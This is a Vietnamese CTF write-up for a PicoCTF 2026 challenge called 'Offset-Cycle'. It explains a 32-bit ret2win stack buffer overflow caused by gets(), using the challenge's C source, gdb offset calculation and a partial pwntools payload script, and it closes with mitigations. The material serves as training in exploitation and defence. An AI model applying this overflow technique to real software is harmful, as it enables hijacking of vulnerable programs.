# PicoCTF 2026: Offset-Cycle

**Category:** Binary Exploitation  |
**Point:** 300 | **For Beginner**

> It's a race against time. Solve the binary exploit ASAP.

```bash
ssh -p <PORT> ctf-player@green-hill.picoctf.net
# Password: password
```
Bạn cần truy cập vào thử thách trên pico để mở instance
## Tóm tắt
Thử thách được tạo ra với một file binary cho phép tạo ra một file C và một file binary chính để chạy. Bên cạnh đó, giới hạn thời gian được áp dụng và được yêu cầu nhập một input chính xác để có được flag

Writeup này được viết bởi chillfish

## 1. Static Reversing
### Chạy thử
Khi chạy thử file binary được tạo, nó yêu cầu nhập string, với số lượng trong phạm vi buff nó sẽ mặc định nhảy tới 0x8049335, còn nếu tràn qua ret thì nhận input làm return address luôn
```bash
Please enter your string:
99999999999999999999999999999999999999999999999
Okay, time to return... Fingers Crossed... Jumping to 0x8049335

Please enter your string:
99999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999
Okay, time to return... Fingers Crossed... Jumping to 0x39393939
Segmentation fault (core dumped)
```
### Hiểu code C

<details>
<summary>Bấm vào để xem full code</summary>
  
```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "CodeBank/asm.h"

#define BUFSIZE 38
#define FLAGSIZE 64

void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("CodeBank/flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "You may not have plenty of time",
                    "to solve the challenge.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```
</details>

Mấy dòng đầu là gọi hàm và file, cũng như khai báo kích thước của Buffer (Ngẫu nhiên với mỗi file được tạo ra mỗi session), flag thì cố định 64 bytes

```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "CodeBank/asm.h"

#define BUFSIZE 38
#define FLAGSIZE 64
```
Tiếp theo là hàm đầu tiên được tạo, nó mở file flag và check xem liệu file còn tồn tại (trong giới hạn thời gian) không để ngắt
Hai dòng cuối tôi sẽ giải thích cặn kẽ hơn:

Hàm ```fgets(Nơi lưu, Số lượng đọc, Nơi đọc) có tác dụng đọc mỗi chuỗi kí tự```
[Hiểu fgets](https://www.geeksforgeeks.org/c/fgets-function-in-c/)

Nói chung nó sẽ đọc từ flag.txt theo kích thước của FLAGSIZE-1 vào biến buf (được gọi ở đoạn ```char buf[FLAGSIZE];```)

Còn ```printf(buf)``` thì mắc một lỗi format strings nhưng do lệnh này ở hàm win và sau lệnh gọi flag nên không cần quan tâm nó nữa
```C
void win() {
  char buf[FLAGSIZE];
  FILE *f = fopen("CodeBank/flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "You may not have plenty of time",
                    "to solve the challenge.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}
```
Hàm cuối này dùng hàm gets(), một hàm dùng để đọc dữ liệu được nhập vào, nhưng nó thiếu kiểm tra độ dài dữ liệu nên nó cho phép ta nhập vào một chuỗi dài hơn 38 bytes đã khai báo ở trên để ghi đè lên các vùng nhớ quan trọng như saved rbp hay return address

[Hiểu gets](https://www.geeksforgeeks.org/c/gets-in-c/)

Flow tiếp theo nó sẽ prinf ra return address của bài qua hàm ```get_return_address()```
```C
void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}
```
Đây là chương trình chính, phần thiết lập buffer này khiến tôi mất kha khá thời gian để hiểu

Đoạn đầu với ```int main(int argc, char **argv){``` khai báo các tham số và vị trí để chương trình tìm đến và chạy đầu tiên

```setvbuf(stdout, NULL, _IONBF, 0)```: là một cơ chế set buffer mode cho chương trình, ở đây dùng _IONF mode (I/O No Buffering), khi có chế độ này, các dữ liệu được truyền thẳng ra màn hình khi được sử dụng, thay vì đợi đầy buffer hoặc dùng các hàm đặc biệt nó mới hiện hết trên màn hình

stdout: dữ liệu cần cấu hình | NULL: hệ thống tự xử lí con trỏ vùng đệm | _IONF: mode | 0: size buffer

```gid_t gid = getegid()``` và ```setresgid(gid, gid, gid)```: Hiểu ngắn gọn thì nó sẽ set permission cho ta như người giữ flag, để tránh permission denied
[Hiểu getegid](https://www.man7.org/linux/man-pages/man2/getgid.2.html)
[Hiểu setresgid](https://linux.die.net/man/2/setresgid)

Theo sau những hàm xử lý luồng dữ liệu là hàm ```puts()``` với nhiệm vụ in ra màn hình chuỗi được cấp. Kế đến gọi hàm ```vuln()``` để người dùng nhập stdin
và rồi return 0; ngắt chương trình
```C
int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);

  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```
### Check bảo mật
```bash
[*] '/home/ctf-player/21'
    Arch:       i386-32-little                   -> Kiến trúc này saved ebp là 4 bytes
    RELRO:      Partial RELRO
    Stack:      No canary found                  -> Không có Canary, dễ dàng thay đổi return address
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x8048000)               -> Không thay đổi Offset mỗi lần chạy
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```
Như code đã phân tích ở trên rằng bài này không có Custom Canary, thêm vào đó địa chỉ process không thay đổi mỗi phiên chạy (No PIE) ta có thể kết luận rằng kĩ thuật khai thác là ret2win
## 2. Dynamic Debugging
### p win
Vì đã biết kĩ thuật khai thác, ta cần tìm được địa chỉ hàm win trước, sử dụng gdb để debug file thực thi chính, sau đó dùng lệnh p win để show ra địa chỉ hàm ```win()``` và nhận lại kết quả là địa chỉ **0x80491f6**
```bash
(gdb) p win
$1 = {<text variable, no debug info>} 0x80491f6 <win>
```

### vuln()
Tiếp tục dùng lệnh ```disas vuln``` để xem các câu lệnh asm và địa chỉ, ta thấy:
```bash
(gdb) disas vuln
Dump of assembler code for function vuln:
   0x08049281 <+0>:     endbr32
   0x08049285 <+4>:     push   %ebp
   0x08049286 <+5>:     mov    %esp,%ebp
   0x08049288 <+7>:     push   %ebx
   0x08049289 <+8>:     sub    $0x94,%esp
   0x0804928f <+14>:    call   0x8049130 <__x86.get_pc_thunk.bx>
   0x08049294 <+19>:    add    $0x2d6c,%ebx
   0x0804929a <+25>:    sub    $0xc,%esp
   0x0804929d <+28>:    lea    -0x96(%ebp),%eax
   0x080492a3 <+34>:    push   %eax
   0x080492a4 <+35>:    call   0x8049050 <gets@plt>
   0x080492a9 <+40>:    add    $0x10,%esp
   0x080492ac <+43>:    call   0x8049344 <get_return_address>
   0x080492b1 <+48>:    sub    $0x8,%esp
   0x080492b4 <+51>:    push   %eax
   0x080492b5 <+52>:    lea    -0x1fa0(%ebx),%eax
   0x080492bb <+58>:    push   %eax
   0x080492bc <+59>:    call   0x8049040 <printf@plt>
   0x080492c1 <+64>:    add    $0x10,%esp
   0x080492c4 <+67>:    nop
   0x080492c5 <+68>:    mov    -0x4(%ebp),%ebx
   0x080492c8 <+71>:    leave
   0x080492c9 <+72>:    ret
End of assembler dump.
```
Vì bài này đặt buffersize biến buf, ta có thể tính toán chính xác size thật sự bằng cách lấy địa chỉ ```saved eip - buf address```. Nhưng trước hết để tìm ra địa chỉ buf ta có thể thông qua hàm gets trong code trên. Đây là những thứ ta cần chú ý
```bash
   0x0804929d <+28>:    lea    -0x96(%ebp),%eax
   0x080492a3 <+34>:    push   %eax
   0x080492a4 <+35>:    call   0x8049050 <gets@plt>
```
Ta sẽ đặt breakpoint tại lệnh lea sử dụng ```b *0x0804929d```, như tôi nói lúc trước ```gets()``` sẽ đưa chuỗi được nhập vào nơi chứa cái được yêu cầu(ở đây là ```gets(buf)```) nên tất cả các chuỗi mình nhập sẽ được đưa vào điểm bắt đầu của buffer, cũng là cái ```ebp-0x3a``` ở trên

Để dễ dàng quan sát ta dùng lệnh r sau khi đặt breakpoint, dùng lệnh ```ni``` (next instruction) để cái địa chỉ của ```ebp-0x3a``` được đưa vào thanh ghi eax. Lúc này, dùng lệnh ```info registers $eax``` (i r $eax) để xem giá trị eax store là bao nhiêu
```bash
(gdb) ni
0x080492a3 in vuln ()
(gdb) i r eax
eax            0xffdc51d2          -2338350
```
Và con số **0xffdc51d2** chính là địa chỉ của đầu buffer. Tiếp tục dùng ```info frame``` (i frame) để giá trị và địa chỉ các thanh ghi trong stack
```bash
(gdb) i frame
Stack level 0, frame at 0xffdc5270:
 eip = 0x80492a3 in vuln; saved eip = 0x8049335
 called by frame at 0xffdc52a0
 Arglist at 0xffdc51c0, args:
 Locals at 0xffdc51c0, Previous frame's sp is 0xffdc5270
 Saved registers:
  ebx at 0xffdc5264, ebp at 0xffdc5268, eip at 0xffdc526c
```
Mấy dòng ở trên là giá trị các thanh ghi chứa, ta chỉ quan tâm cái ```eip at 0xffdc526c``` vì đây là đỉnh stack, chứa return address. Sử dụng lệnh ```p 0xffdc526c-0xffdc51d2``` sẽ ra chính xác offset cần tìm:
```bash
(gdb) p 0xffdc526c-0xffdc51d2
$1 = 154
```
## 3. Chiến thuật khai thác
Con số 154 chính xác là cái **rbp-0x96** mà lệnh lea ở chỉ vào + **4 byte** của saved ebp (4 bytes vì đây là kiến trúc **32bit i386**, còn đối với kiến trúc **64 bit** thì save rbp luôn là **8 bytes**) = 154 byte

Như vậy ta thấy địa chỉ buffer cố định trên ```lea ebp-(offset-4)```. Nhưng vì bài này giới hạn thời gian nên chúng ta sẽ sử dụng payload script để tìm ra flag, và tôi cũng sẽ thử lại một phiên mới để nhanh tìm ra offset
### Payload
Sử dụng python để viết script là lựa chọn tốt nhất, ta hàm thư viện pwn kết hợp các hàm process, sendline và interactive để khai thác
```python
from pwn import *

p.process('./filename')

win = p32(0x80491f6)
payload = b'a'*... + b'b'*4 + win

p.sendline(payload)

p.interactive()
```
Kết quả thu dược:
```bash
ctf-player@pico-chall$ python3 k.py
[+] Starting local process './19': pid 134
[*] Switching to interactive mode
Please enter your string:
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{}[*] Got EOF while reading in interactive
```
Tự làm để lấy flag đi nhé!
## 4. Kết luận
Lỗ hổng: Sử dụng hàm gets() tại hàm vuln(). Hàm này vô cùng rủi ro vì nó không kiểm tra kích thước dữ liệu so với vùng đệm BUFSIZE

Hậu quả: Ghi đè lên Saved EBP và Saved EIP dễ dàng nếu như không có Canary = ret2win

Giải pháp:
* Sử dụng các hàm khác an toàn hơn như fgets(buf, sizeof(buf), stdin) thay cho gets vì nó lấy theo kích thước buf (sizeof)
* Bật Stack Canaries (-fstack-protector) để phát hiện BOF trước khi hàm trả về [Cách bật/tắt ở đây](https://stackoverflow.com/questions/66976137/how-to-enable-disable-canary)
* Và một số giải pháp khác tôi chưa học đến
